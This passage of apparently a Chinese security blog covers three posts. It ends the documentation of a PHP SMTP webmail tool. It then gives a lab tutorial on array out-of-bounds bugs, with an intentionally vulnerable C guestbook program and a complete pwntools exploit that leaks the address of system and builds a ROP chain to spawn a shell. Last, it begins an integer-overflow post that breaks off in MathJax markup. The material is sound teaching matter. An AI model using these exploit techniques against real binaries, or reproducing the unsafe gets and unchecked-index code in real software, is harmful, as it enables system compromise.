<li>body：邮件内容 </li>
<li>mailtype：邮件格式 </li>
<li>client_ip：浏览器IP </li>
<li>client_port：浏览器端口 </li>
<li>server_ip：服务器IP </li>
<li>server_port：服务器端口</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_send() </p>
<ul>
<li>功能：与收件人邮箱服务器进行交互，发送邮件 </li>
<li>参数： <ul>
<li>helo：连接请求 </li>
<li>from：发件人 </li>
<li>to：收件人 </li>
<li>header：邮件头 </li>
<li>body：邮件内容 </li>
<li>filename：日志文件</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_sockopen() ——sock函数 </p>
<ul>
<li>功能：搭建的邮箱服务器与收件人邮箱服务器建立sock连接 </li>
<li>参数： <ul>
<li>address：收件人邮箱地址 </li>
<li>filename：日志文件</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_message() </p>
<ul>
<li>功能：将邮件主题和内容组合在一起 </li>
<li>参数： <ul>
<li>header：邮件头 </li>
<li>body：邮件内容</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_eom()</p>
<ul>
<li>功能：将邮件主题和内容组合在一起 </li>
<li>参数： <ul>
<li>filename：日志文件；</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_ok() </p>
<ul>
<li>功能：查看返回信息判断是否成功连接到smtp； </li>
<li>参数： <ul>
<li>filename：日志文件；</li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_putcmd() </p>
<ul>
<li>功能：构造需要发送的命令； </li>
<li>参数： <ul>
<li>cmd：指令； </li>
<li>filename：日志文件；</li>
</ul>
</li>
</ul>
</li>
<li><p>function strip_comment() </p>
<ul>
<li>功能：邮箱地址过滤，有些时候会在邮箱后面写上一些评论，需要将评论删除； </li>
<li>参数：<ul>
<li>address：IP地址； </li>
</ul>
</li>
</ul>
</li>
<li><p>function get_address() </p>
<ul>
<li>功能：邮箱地址过滤，有些邮箱地址会写成xxx@ 163.com,目的在于过滤掉 括号里面的内容、换行、缩进等； </li>
<li>参数： <ul>
<li>address：IP地址； </li>
</ul>
</li>
</ul>
</li>
<li><p>function smtp_debug() </p>
<ul>
<li>功能：调试程序时用到； </li>
<li>参数： <ul>
<li>message：与收件人邮箱服务器交换的信息；</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="函数关系图"><a href="#函数关系图" class="headerlink" title="函数关系图"></a>函数关系图</h4><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200315191707.png"></p>
<h4 id="算法流程图"><a href="#算法流程图" class="headerlink" title="算法流程图"></a>算法流程图</h4><h5 id="sendmail-函数NS盒图"><a href="#sendmail-函数NS盒图" class="headerlink" title="sendmail()函数NS盒图"></a>sendmail()函数NS盒图</h5><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200315191817.png"></p>
<h5 id="smtp-send-函数NS盒图"><a href="#smtp-send-函数NS盒图" class="headerlink" title="smtp_send()函数NS盒图"></a>smtp_send()函数NS盒图</h5><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200315191857.png"></p>
<h5 id="smtp-socketopen-函数NS盒图"><a href="#smtp-socketopen-函数NS盒图" class="headerlink" title="smtp_socketopen()函数NS盒图"></a>smtp_socketopen()函数NS盒图</h5><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200315191938.png"></p>
<h4 id="函数实现要点"><a href="#函数实现要点" class="headerlink" title="函数实现要点"></a>函数实现要点</h4><ol>
<li><p>php语言建立sock连接较为简单，只需要使用如下命令，通过smtp_ok判断连接是否建立即可；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;sock = @<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$this</span>-&gt;relay_host, <span class="variable">$this</span>-&gt;smtp_port, <span class="variable">$errno</span>,</span><br><span class="line"><span class="variable">$errstr</span>, <span class="variable">$this</span>-&gt;time_out);</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable language_">$this</span>-&gt;sock &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">smtp_ok</span>(<span class="variable">$filename</span>))) &#123;</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="string">&quot;Error:无法连接SMTP服务器&quot;</span> . <span class="variable">$this</span>-&gt;relay_host . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="string">&quot;Error: &quot;</span> . <span class="variable">$errstr</span> . <span class="string">&quot; (&quot;</span> . <span class="variable">$errno</span> . <span class="string">&quot;)\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Error:无法连接SMTP服务器&#x27;. <span class="subst">$this</span>-</span></span><br><span class="line"><span class="string">&gt;relay_host);parent.document.ADDUser.cheheh.click();&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&#x27;Error:&#x27;.<span class="subst">$errstr</span>.&#x27;(&#x27;.f<span class="subst">$errno</span>.&#x27;)&#x27;);parent.document.ADDUser.cheh</span></span><br><span class="line"><span class="string">eh.click();&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>使用如下命令获取客户端和服务器的IP地址和端口号；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">//客户端IP</span></span><br><span class="line"><span class="variable">$client_port</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>]; <span class="comment">//客户端端口号</span></span><br><span class="line"><span class="variable">$server_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]; <span class="comment">//服务器IP</span></span><br><span class="line"><span class="variable">$server_port</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]; <span class="comment">//服务器端口</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用如下正则表达式检测邮箱地址的合法性；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/\w+([-+.<span class="string">&#x27;]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/</span></span><br></pre></td></tr></table></figure></li>
<li><p>为防止攻击，选择在后端检查邮箱的合法性，而不是在前端调用JavaScript；</p>
</li>
</ol>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>SMTP</tag>
        <tag>webmail</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-数组越界漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="数组的原理"><a href="#数组的原理" class="headerlink" title="数组的原理"></a>数组的原理</h2><ul>
<li>  数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素；<span id="more"></span></li>
<li>  数组通过数组名在内存中找到对应的数组空间；</li>
<li>  数组元素通过数组名和索引获取；</li>
</ul>
<p>如下程序定义了含有10个元素的数组a，依次打印出数组元素的地址；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a's address: %p\n"</span>, &amp;a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) {</span><br><span class="line">        a[i] = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a[%d]'s address: %p\n"</span>, i, &amp;a[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>运行结果显示，各个元素之间的地址相差一个int类型数值的大小，a[4]的地址与a的地址相 差0x10个字节，即4*sizeof(int)大小；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png" style="zoom:40%;">

<p>通过IDA的反汇编进一步明确元素的寻址方式，IDA能够获取各个变量用ebp表示出的地址，数组a的地址为<code>ebp-0x34</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223113130.png" style="zoom:50%;">

<p>下图汇编语言中，变量i的地址是<code>ebp-0x0C</code>，将i的值赋给eax和edx，然后将edx的值赋给数组元素；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223114222.png" style="zoom:50%;">

<p>每个数组元素的地址为<code>ebp-0x34+eax*4</code>，其中<code>ebp-0x34</code>是数组a的地址，<code>eax*4</code>是索引<code>i*sizeof(int)</code>；</p>
<p>因此，确定<strong>数组元素寻址方式</strong>为<code>数组地址+索引*数组元素大小</code>；</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>C和C++不对数组做边界检查，除了语言对编程人员信任和程序性能的顾虑外，C和C++的数组边界检查本身也是一件困难的事情：</p>
<ul>
<li>  数组越界的判定不仅依赖于下标的值，也依赖于指针的类型；</li>
<li>  对于指向数组的指针来说，在程序中若没有显式的指明数组长度，还需要证明其地址计算结果位于该数组内；</li>
<li>  程序运行时，数组可能重新进行了动态分配，长度发生了变化；</li>
</ul>
<p>这些情况使得边界检查将会给程序性能带来极大的负担，C和C++中并不能很好的防范数组越界漏洞；</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h2><p>以如下程序为例进行漏洞分析；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* guestbook */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> **tmp;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *sys;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *dest[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please setup your guest book"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Name for guest: #%d\n&gt;&gt;&gt;"</span>,i);</span><br><span class="line">        name = <span class="built_in">malloc</span>(<span class="number">0xf</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%15s"</span>,name);</span><br><span class="line">        getchar();</span><br><span class="line">        name[<span class="number">14</span>]=<span class="number">0</span>;</span><br><span class="line">        dest[i]=name;</span><br><span class="line">    }</span><br><span class="line">    tmp = dest;</span><br><span class="line">    sys = &amp;system;</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag){</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"---------------------------"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"1: View name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"2: Change name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"3. Quit"</span>);</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line">		<span class="keyword">switch</span>(choice){</span><br><span class="line">	    	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Which entry do you want to view?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>){</span><br><span class="line">                	<span class="built_in">puts</span>(dest[num]);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span>{</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="comment">//readName(dest);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Which entry do you want to change?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>){</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"Enter the name of the new guest.\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                     gets(&amp;s);</span><br><span class="line">                     <span class="built_in">strcpy</span>(dest[num], &amp;s);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span>{</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Not a valid option. Try again"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        } </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    function();</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
<li>  代码实现了简单的查看名字和修改名字的功能，用户输入4个名字后，把字符串所在的地址存入指针数组dest中；</li>
<li>  在case1中，通过输入序号查看对应的名字;</li>
<li>  在case2中，通过输入序号修改对应的名字；</li>
<li>  这两个环节没有对输入的序号做检查，由于数组dest只有4个元素，当输入的序号大于3或小于0，都会造成数组越界；</li>
</ul>
<p>运行guestbook</p>
<ul>
<li><p>  查看功能输入大于3的序号，会输出乱码；</p>
</li>
<li><p>修改功能输入大于3的序号则会出现段错误；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223175347.png" style="zoom:40%;"></li>
</ul>
<p>由此判断本程序中的<strong>数组越界漏洞</strong>能够<strong>对内存进行查看和修改</strong>；</p>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>程序中sys变量记录了system函数的地址，利用的思路是，通过数组越界读取sys变量的值即system函数的地址，并利用数组越界构造ROP覆写返回地址为system函数，最终获取shell：</p>
<ul>
<li><p>读取system地址：</p>
<p>  程序中将system函数的地址写在了sys变量里，通过IDA来查看该变量的地址；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304015109.png" style="zoom:50%;">

<ul>
<li>  s[4]即为dest数组的地址为<code>ebp-0x2C</code>；</li>
<li>  V5记录了system的地址，为<code>ebp-0x1C</code>；</li>
</ul>
</li>
</ul>
<p>结合gdb调试进行进一步观察 ，在system地址赋值之后设置断点，查看栈中内容如下</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304013336.png" style="zoom:50%;">

<ul>
<li>  数组dest中存放字符串地址，接下来是system地址和dest地址；</li>
<li>  由于数组dest的参数是字符串地址，为了读出system地址，输入序号5，这样越过数组dest的边界覆盖了紧邻的<code>0xffe61bec</code>，即dest数组的地址；</li>
<li>  puts函数会在遇到<code>\0</code>时停止输出，因此可以从<code>0xffe61bec</code>一直往后读直到遇到结束符<code>\0</code>，里面就包含了system函数地址；</li>
</ul>
<h2 id="构造ROP劫持程序流"><a href="#构造ROP劫持程序流" class="headerlink" title="构造ROP劫持程序流"></a>构造ROP劫持程序流</h2><ul>
<li><p>  除了利用数组越界读取数据，还可以对栈中内容进行覆写；</p>
</li>
<li><p>  构造一个ROP，让<code>function</code>函数返回时执行system函数，从而获取shell；</p>
</li>
<li><p>  在修改名字时仍然选择序号5，为了能够将ROP覆写从返回地址的位置，填充从<code>0xffe61bec</code>到返回地址之间的内存；</p>
</li>
<li><p>payload如下</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br></pre></td></tr></table></figure></li>
<li><p>覆写之后的栈中内容如下；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304013516.png" style="zoom:50%;"></li>
<li><p>  接着执行ret指令，相当于执行<code>pop eip</code>，eip就会指向system函数地址，esp则向下移动到<code>0xffe61c1c</code>处；</p>
</li>
<li><p>跟踪进入system函数后，后续将先执行<code>sub esp,0xc</code>，然后通过<code>esp+0x10</code>查找system函数的参数，此时esp为<code>0xffe61c20-0xc=0xffe61c14</code>，<code>esp+0x10</code>即为<code>0xffe61c24</code>，正好为写入<code>/bin/sh</code>字符串的地址处；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304013902.png" style="zoom:50%;"></li>
<li><p>最终payload如下；</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r= process(<span class="string">"./guestbook"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'B'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'C'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'D'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">data = r.recv(<span class="number">20</span>)</span><br><span class="line">system = u32(data[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">"[*]system:0x%x"</span> %system</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">"./guestbook"</span>).libc</span><br><span class="line">l.address = system - l.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[*]base: 0x%x"</span> % l.address)</span><br><span class="line"></span><br><span class="line">binsh = l.search(<span class="string">"/bin/sh\x00"</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">"[*]binsh:0x%x"</span> %binsh</span><br><span class="line"></span><br><span class="line">rop = p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210304014432.png" style="zoom:50%;"></li>
</ul>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>数组越界</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-整数溢出漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ul>
<li>  在计算机中，整数类型分为<strong>无符号整数</strong>和<strong>有符号整数</strong>两种；</li>
<li>  有符号整数会在最高位用0表示正数，1表示负数，而无符号整数则没有这种规则；</li>
<li>  常见的整数类型有8位(单字节字符类型、布尔类型)、16位(短整型)、32位(长整型)等；</li>
<li>  当一个整数存入了比它本身小的存储空间中，超出了数据类型所能表示的范围时，就会发生整数溢出；</li>
</ul>
<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">关键字</th>
<th align="center">占用字节</th>
<th align="center">表示范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">字符型</td>
<td align="center">char</td>
<td align="center">1</td>
<td align="center">-128~127</td>
</tr>
<tr>
<td align="center">无符号字符型</td>
<td align="center">unsigned char</td>
<td align="center">1</td>
<td align="center">0~255</td>
</tr>
<tr>
<td align="center">布尔型</td>
<td align="center">bool</td>
<td align="center">1</td>
<td align="center">0~1</td>
</tr>
<tr>
<td align="center">短整型</td>
<td align="center">short</td>
<td align="center">2</td>
<td align="center">-32768~32767</td>
</tr>
<tr>
<td align="center">无符号短整型</td>
<td align="center">unsigned short</td>
<td align="center">2</td>
<td align="center">0～65535</td>
</tr>
<tr>
<td align="center">整型</td>
<td align="center">int</td>
<td align="center">4</td>
<td align="center"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.679ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 2068.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(778,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>~<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 3790.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1901.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2901.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3401.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 